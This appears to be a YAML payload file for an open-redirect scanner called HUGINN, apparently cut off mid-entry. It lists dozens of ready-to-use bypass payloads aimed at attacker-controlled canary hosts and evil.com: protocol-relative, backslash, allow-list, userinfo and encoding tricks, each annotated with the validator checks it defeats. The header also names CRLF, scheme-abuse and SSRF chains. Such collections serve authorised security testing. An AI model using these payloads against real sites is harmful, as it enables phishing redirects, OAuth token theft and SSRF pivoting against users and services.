# =============================================================================
#  HUGINN :: payloads/open_redirect.yaml
#  Comprehensive Open Redirect Arsenal — 2026 Edition
# -----------------------------------------------------------------------------
#  Placeholders (substituted by scanner at load time):
#    {{ATTACKER}}   → beardedviking.org           (static attacker domain)
#    {{TARGET}}     → target under test            (e.g. vulnerable-site.com)
#    {{SUBDOMAIN}}  → target's primary hostname    (e.g. app.vulnerable-site.com)
#    {{CANARY}}     → redirect.beardedviking.org   (canary host)
#    {{CANARY_URL}} → https://redirect.beardedviking.org/<token>/<id>
#                     (tokenized canary URL — unique per payload)
#    {{OOB}}        → https://oast.beardedviking.org/<token>/<id>
#                     (tokenized OOB URL for chains)
#
#  Categories:
#    - basic                : plain absolute URLs
#    - protocol_relative    : scheme-relative //domain
#    - backslash            : Windows/IE-style \/ bypass (2026 CVEs active)
#    - whitelist_bypass     : make the URL look trusted
#    - userinfo             : URL @ parsing quirks
#    - encoding             : URL/double/hex/unicode/triple encoding
#    - scheme_abuse         : javascript:, data:, vbscript:, blob:, file:
#    - fragment             : # and ?-confusion tricks
#    - crlf                 : header injection / response splitting
#    - parameter_pollution  : duplicate params, array syntax, HPP
#    - oauth_sso            : redirect_uri, RelayState, returnTo, next
#    - header_based         : Referer / X-Forwarded-Host driven redirects
#    - cookie_based         : cookie-set redirect chains
#    - path_traversal       : ../../ and client-side path traversal chains
#    - cloud_specific       : cloud metadata / SSRF chains
#    - unicode              : NFKC / homoglyph / fullwidth bypasses
#    - whitespace           : leading space/tab/CR/control chars
#    - modern               : 2025/2026 parser-differential research
#    - legacy               : 1990s–2000s syntax quirks
#    - client_side          : DOM sinks (window.location, meta refresh, JS)
# =============================================================================

meta:
  name: "HUGINN Open Redirect Arsenal"
  version: "3.0.0"
  description: >
    Comprehensive open redirect payload set spanning 1990s legacy quirks
    through 2025/2026 parser-differential bypasses, OAuth/SSO chain extension,
    CRLF response splitting, Unicode NFKC normalisation, and cloud metadata
    SSRF pivoting. Every payload carries metadata for context-aware routing
    and tokenized canary correlation.
  attacker_placeholder: "{{ATTACKER}}"
  target_placeholder:   "{{TARGET}}"
  subdomain_placeholder: "{{SUBDOMAIN}}"
  canary_placeholder:   "{{CANARY}}"
  oob_placeholder:      "{{OOB}}"
  references:
    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
    - "https://portswigger.net/web-security/ssrf"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
    - "https://hacktricks.wiki/en/pentesting-web/open-redirect.html"
    - "https://github.com/cujanovic/Open-Redirect-Payloads"
    - "https://www.vulnsy.com/cheat-sheets/open-redirect"
    - "https://github.com/0xNanda/Oralyzer"
    - "https://github.com/devanshbatham/OpenRedireX"
  last_updated: "2026-09-11"

payloads:

  # ===========================================================================
  #  1. BASIC
  #     The obvious cases. If any of these work, the app has no redirect
  #     allow-listing at all. Report as high-confidence immediately.
  # ===========================================================================
  - id: "basic-001"
    name: "Absolute HTTPS to canary"
    category: "basic"
    payload: "https://{{CANARY}}/huginn/{{RANDOM}}"
    description: "Plain absolute HTTPS redirect to canary host — baseline test."
    tags: ["basic", "absolute"]
    browsers: ["all"]
    expected: "302/301/303/307/308 with Location: https://redirect.beardedviking.org/..."
    severity_hint: "high"
    interaction: false

  - id: "basic-002"
    name: "Absolute HTTP to canary"
    category: "basic"
    payload: "http://{{CANARY}}/huginn/{{RANDOM}}"
    description: "Plain absolute HTTP redirect."
    tags: ["basic", "absolute"]
    browsers: ["all"]
    expected: "302/301/303/307/308 with Location: http://redirect.beardedviking.org/..."
    severity_hint: "high"
    interaction: false

  - id: "basic-003"
    name: "Missing slash after scheme"
    category: "basic"
    payload: "https:{{CANARY}}"
    description: "Missing // after scheme — some parsers normalise to https://."
    tags: ["basic", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-004"
    name: "Single slash after scheme"
    category: "basic"
    payload: "https:/{{CANARY}}"
    description: "Single-slash — browser normalises to https://attacker."
    tags: ["basic", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-005"
    name: "Triple slash"
    category: "basic"
    payload: "https:///{{CANARY}}"
    description: "Triple slash — RFC 3986 treats third / as path on strict parsers."
    tags: ["basic", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-006"
    name: "Uppercase scheme"
    category: "basic"
    payload: "HTTPS://{{CANARY}}/"
    description: "Uppercase scheme bypasses case-sensitive scheme allow-lists."
    tags: ["basic", "case"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-007"
    name: "Absolute with explicit port"
    category: "basic"
    payload: "https://{{CANARY}}:443/"
    description: "Explicit port — sometimes matches allow-list regexes that expect one."
    tags: ["basic", "port"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-008"
    name: "Absolute with basic-auth credentials"
    category: "basic"
    payload: "https://user:pass@{{CANARY}}/"
    description: "Basic-auth style URL — naive validators only check host before @."
    tags: ["basic", "userinfo"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-009"
    name: "Mixed-case scheme"
    category: "basic"
    payload: "HtTpS://{{CANARY}}/"
    description: "Mixed-case scheme — defeats case-sensitive prefix checks."
    tags: ["basic", "case"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "basic-010"
    name: "Four slashes"
    category: "basic"
    payload: "https:////{{CANARY}}"
    description: "Four slashes — collapses to //canary on some parsers."
    tags: ["basic", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  # ===========================================================================
  #  2. PROTOCOL-RELATIVE
  #     //attacker — inherits scheme. Single most common bypass.
  #     Also active in 2025/2026 CVEs (Rodauth, Koa, Nitro).
  # ===========================================================================
  - id: "proto-001"
    name: "Classic protocol-relative"
    category: "protocol_relative"
    payload: "//{{CANARY}}/"
    description: "Classic // — inherits scheme from current page."
    tags: ["protocol-relative", "classic"]
    browsers: ["all"]
    expected: "302 with Location: //redirect.beardedviking.org/"
    severity_hint: "high"
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-82467"]
    interaction: false

  - id: "proto-002"
    name: "Triple slash"
    category: "protocol_relative"
    payload: "///{{CANARY}}/"
    description: "Triple slash — some parsers strip one and normalise to //."
    tags: ["protocol-relative", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "proto-003"
    name: "Protocol-relative with tab"
    category: "protocol_relative"
    payload: "/\t/{{CANARY}}/"
    description: "Tab between slashes — parser differential (CVE-2026-75628)."
    tags: ["protocol-relative", "whitespace"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://vuldb.com/cve/CVE-2026-75628"]
    interaction: false

  - id: "proto-004"
    name: "Protocol-relative with newline"
    category: "protocol_relative"
    payload: "/\n/{{CANARY}}/"
    description: "Newline between slashes — parser differential."
    tags: ["protocol-relative", "whitespace"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "proto-005"
    name: "Protocol-relative with CR"
    category: "protocol_relative"
    payload: "/\r/{{CANARY}}/"
    description: "CR between slashes — CRLF-adjacent parser differential."
    tags: ["protocol-relative", "whitespace"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "proto-006"
    name: "Trailing double-slash with prefix"
    category: "protocol_relative"
    payload: "//{{CANARY}}/%2F.."
    description: "Trailing double-slash — Koa/Express bypass (CVE-2025-62595)."
    tags: ["protocol-relative", "trailing-slash", "2025"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-62595"]
    interaction: false

  - id: "proto-007"
    name: "Many slashes"
    category: "protocol_relative"
    payload: "////////{{CANARY}}/"
    description: "Eight slashes — collapses to protocol-relative on some parsers."
    tags: ["protocol-relative", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "proto-008"
    name: "Protocol-relative with auth"
    category: "protocol_relative"
    payload: "//user:pass@{{CANARY}}/"
    description: "Protocol-relative with credentials."
    tags: ["protocol-relative", "userinfo"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  # ===========================================================================
  #  3. BACKSLASH TRICKS
  #     Browsers normalise \ to / for special schemes. Multiple 2026 CVEs.
  #     (Punk::OAuth2, CakePHP, Gitea, pac4j, React Router, Grav, Probo)
  # ===========================================================================
  - id: "backslash-001"
    name: "Single backslash after slash"
    category: "backslash"
    payload: "/\\{{CANARY}}/"
    description: "Browsers normalise to //canary — bypasses validators expecting /."
    tags: ["backslash", "classic"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://vuldb.com/cve/CVE-2026-75628", "https://vuldb.com/cve/CVE-2026-82464"]
    interaction: false

  - id: "backslash-002"
    name: "Backslash forward mix"
    category: "backslash"
    payload: "\\/{{CANARY}}/"
    description: "Mixed \\/ — bypasses naive normalisers."
    tags: ["backslash", "classic"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-003"
    name: "Double backslash"
    category: "backslash"
    payload: "\\\\{{CANARY}}/"
    description: "Double backslash — IE/Edge historically normalised to //."
    tags: ["backslash", "legacy"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-004"
    name: "Triple backslash"
    category: "backslash"
    payload: "\\\\\\{{CANARY}}/"
    description: "Triple backslash — bypasses normalisers that only collapse double."
    tags: ["backslash", "encoding"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-005"
    name: "Absolute with backslash after scheme"
    category: "backslash"
    payload: "https:\\\\{{CANARY}}/"
    description: "https:\\\\canary — Windows-style path normalisation."
    tags: ["backslash", "windows"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-006"
    name: "Mixed scheme separator"
    category: "backslash"
    payload: "https:/\\/{{CANARY}}/"
    description: "Scheme followed by mixed slashes."
    tags: ["backslash", "parser-quirk"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-007"
    name: "Encoded backslash"
    category: "backslash"
    payload: "https://{{TARGET}}/%5C{{CANARY}}/"
    description: "Percent-encoded backslash — decoded by backend, then normalised by browser."
    tags: ["backslash", "encoding", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-25779"]
    interaction: false

  - id: "backslash-008"
    name: "Double-encoded backslash"
    category: "backslash"
    payload: "https://{{TARGET}}/%255C{{CANARY}}/"
    description: "Double-encoded backslash — bypasses single-decode validators."
    tags: ["backslash", "encoding", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-009"
    name: "Backslash before @ in authority"
    category: "backslash"
    payload: "https://{{TARGET}}\\@{{CANARY}}/"
    description: "Backslash before @ — Windows-parser differential."
    tags: ["backslash", "userinfo"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "backslash-010"
    name: "Path traversal + double backslash"
    category: "backslash"
    payload: "/..//\\{{CANARY}}/"
    description: "Traversal + backslash combo — Grafana CVE-2025-6023 bypass."
    tags: ["backslash", "path_traversal", "2025"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://ethiack.com/news/grafana-cve-2025-6023-bypass"]
    interaction: false

  # ===========================================================================
  #  4. WHITELIST BYPASS
  #     Make the URL *appear* to start with the trusted domain.
  # ===========================================================================
  - id: "wl-001"
    name: "Trusted-prefix dot-suffix"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}.{{CANARY}}/"
    description: "Target as subdomain of canary — bypasses startswith() checks."
    tags: ["whitelist_bypass", "subdomain"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://cve.threatint.com/CVE/CVE-2026-25477"]
    interaction: false

  - id: "wl-002"
    name: "Attacker domain with target in query"
    category: "whitelist_bypass"
    payload: "https://{{CANARY}}?{{TARGET}}"
    description: "Canary first, target in query — bypasses 'target anywhere' regex."
    tags: ["whitelist_bypass", "query-confusion"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-003"
    name: "Target as userinfo"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}@{{CANARY}}/"
    description: "Target as userinfo before @ — browser navigates to canary."
    tags: ["whitelist_bypass", "userinfo", "classic"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-004"
    name: "Target as path"
    category: "whitelist_bypass"
    payload: "https://{{CANARY}}/{{TARGET}}"
    description: "Target in path — bypasses naive 'target in url' checks."
    tags: ["whitelist_bypass", "path-confusion"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-005"
    name: "Target in fragment"
    category: "whitelist_bypass"
    payload: "https://{{CANARY}}/#{{TARGET}}"
    description: "Target in fragment — fragments not sent to servers."
    tags: ["whitelist_bypass", "fragment"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-006"
    name: "Trailing dot bypass"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}.{{CANARY}}./"
    description: "Trailing dot — some DNS resolvers still resolve, validators reject."
    tags: ["whitelist_bypass", "trailing-dot"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-007"
    name: "Target port trick"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}:{{CANARY}}"
    description: "Malformed port — parser may resolve to canary or error."
    tags: ["whitelist_bypass", "port"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "wl-008"
    name: "Chained redirect via target login"
    category: "whitelist_bypass"
    payload: "https://{{CANARY}}/login?next=https://{{TARGET}}/"
    description: "Chained redirect — outer URL looks legit."
    tags: ["whitelist_bypass", "chained"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "wl-009"
    name: "Suffix-match bypass (CVE-2026-25477)"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}.evil.com/"
    description: "Malicious domain ending with trusted string — regex not anchored."
    tags: ["whitelist_bypass", "regex-bypass", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://cve.threatint.com/CVE/CVE-2026-25477"]
    interaction: false

  - id: "wl-010"
    name: "Target with @ and fragment distraction"
    category: "whitelist_bypass"
    payload: "https://{{TARGET}}@{{CANARY}}/#@{{TARGET}}"
    description: "Canary in authority, target appearing twice as distraction."
    tags: ["whitelist_bypass", "userinfo"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "wl-011"
    name: "Subdomain-of-target bypass"
    category: "whitelist_bypass"
    payload: "https://{{CANARY}}.{{TARGET}}/"
    description: "Reverse subdomain confusion — canary as subdomain of target."
    tags: ["whitelist_bypass", "subdomain"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "wl-012"
    name: "Backslash whitelist bypass (CVE-2026-55590)"
    category: "whitelist_bypass"
    payload: "http://{{TARGET}}\\.{{CANARY}}"
    description: "Backslash in authority — Flask-Security whitelist bypass."
    tags: ["whitelist_bypass", "backslash", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://github.com/advisories/GHSA-w2j7-f3c6-g8cw"]
    interaction: false

  # ===========================================================================
  #  5. USERINFO
  #     The @ in URLs is a classic parser-differential zone.
  # ===========================================================================
  - id: "ui-001"
    name: "Canary as userinfo, target as host"
    category: "userinfo"
    payload: "https://{{CANARY}}@{{TARGET}}/"
    description: "Canary in userinfo — browser navigates to target."
    tags: ["userinfo", "classic"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "ui-002"
    name: "Target as userinfo, canary as host"
    category: "userinfo"
    payload: "https://{{TARGET}}@{{CANARY}}/"
    description: "Validators checking 'starts with target' pass, browser goes to canary."
    tags: ["userinfo", "classic"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "ui-003"
    name: "Userinfo with password"
    category: "userinfo"
    payload: "https://user:pass@{{CANARY}}/"
    description: "Standard basic-auth form."
    tags: ["userinfo"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "ui-004"
    name: "Encoded @"
    category: "userinfo"
    payload: "https://{{TARGET}}%40{{CANARY}}/"
    description: "Percent-encoded @ — some parsers decode before validation."
    tags: ["userinfo", "encoding"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "ui-005"
    name: "Double @"
    category: "userinfo"
    payload: "https://{{TARGET}}@@{{CANARY}}/"
    description: "Double @ — legacy parser confusion."
    tags: ["userinfo", "legacy"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "ui-006"
    name: "Backslash before @"
    category: "userinfo"
    payload: "https://{{TARGET}}\\@{{CANARY}}/"
    description: "Backslash before @ — Windows-parser differential (CVE-2026-75833)."
    tags: ["userinfo", "backslash", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-75833"]
    interaction: false

  - id: "ui-007"
    name: "Unicode fullwidth @"
    category: "userinfo"
    payload: "https://{{TARGET}}＠{{CANARY}}/"
    description: "Fullwidth @ (U+FF20) — NFKC-normalising parsers accept it."
    tags: ["userinfo", "unicode", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://cve.imfht.com/detail/CVE-2026-73420"]
    interaction: false

  - id: "ui-008"
    name: "Target with bracket and @ (HackTricks 2026)"
    category: "userinfo"
    payload: "https://{{TARGET}}[@{{CANARY}}/"
    description: "Bracket then @ — bypasses server-side URL parsers while browsers navigate to canary."
    tags: ["userinfo", "parser-differential", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    references: ["https://hacktricks.wiki/en/pentesting-web/open-redirect.html"]
    interaction: false

  - id: "ui-009"
    name: "Encoded bracket with @"
    category: "userinfo"
    payload: "https://{{TARGET}}%5B@{{CANARY}}/"
    description: "Percent-encoded bracket then @ — server-side parser confusion."
    tags: ["userinfo", "encoding", "2026"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  # ===========================================================================
  #  6. ENCODING
  #     URL, double-URL, triple-URL, hex, unicode, overlong UTF-8.
  # ===========================================================================
  - id: "enc-001"
    name: "URL-encoded scheme"
    category: "encoding"
    payload: "https%3A%2F%2F{{CANARY}}%2F"
    description: "Full URL-encoding of https://canary/."
    tags: ["encoding", "url"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "enc-002"
    name: "URL-encoded slashes only"
    category: "encoding"
    payload: "https:%2F%2F{{CANARY}}%2F"
    description: "Only slashes encoded — scheme stays visible."
    tags: ["encoding", "url"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "enc-003"
    name: "Double URL-encoded scheme"
    category: "encoding"
    payload: "https%253A%252F%252F{{CANARY}}%252F"
    description: "Double-encoded — bypasses WAFs that decode once."
    tags: ["encoding", "double-url"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "enc-004"
    name: "Triple URL-encoded scheme"
    category: "encoding"
    payload: "https%25253A%25252F%25252F{{CANARY}}%25252F"
    description: "Triple-encoded — for parsers that decode multiple times."
    tags: ["encoding", "triple-url"]
    browsers: ["all"]
    severity_hint: "high"
    interaction: false

  - id: "enc-005"
    name: "Hex-encoded scheme"
    category: "encoding"
    payload: "0x68 0x74 0x74 0x70 0x73 0x3A 0x2F 0x2F{{CANARY}}"
    description: "Hex representation — occasionally parsed by odd backends."
    tags: ["encoding", "hex"]
    browsers: ["legacy"]
    severity_hint: "medium"
    interaction: false

  - id: "enc-006"
    name: "Mixed-case percent encoding"
    category: "encoding"
    payload: "https:%2f%2F{{CANARY}}%2f"
    description: "Mixed-case percent-encoding — bypasses case-sensitive normalisers."
    tags: ["encoding", "case"]
    browsers: ["all"]
    severity_hint: "medium"
    interaction: false

  - id: "enc-007"
    name: "Overlong UTF-8 slash"
    category: "encoding"
    payload: "https:%c0%af%c0%af{{CANARY}}"
    description: "Overlong UTF-8 encoding of / — legacy IIS quirk."
    tags: ["encoding", "overlong-utf8", "legacy"]
    browsers: ["legacy"]
    severity_hint: "medium"
    interaction: false

  - id: "enc-008"
    name: "Percent-encoded hostname dots"
